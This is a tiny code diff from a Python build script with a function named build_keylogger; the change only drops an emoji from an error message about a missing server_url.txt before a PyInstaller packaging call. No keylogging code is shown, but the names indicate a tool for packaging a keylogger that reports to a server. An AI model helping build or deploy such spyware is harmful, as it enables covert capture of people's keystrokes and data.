@@ -7,7 +7,7 @@ def build_keylogger():
     
     # Ensure server URL is available
     if not os.path.exists("server_url.txt"):
-        print("❌ server_url.txt not found!")
+        print("server_url.txt not found!")
         return
     
     PyInstaller.__main__.run([
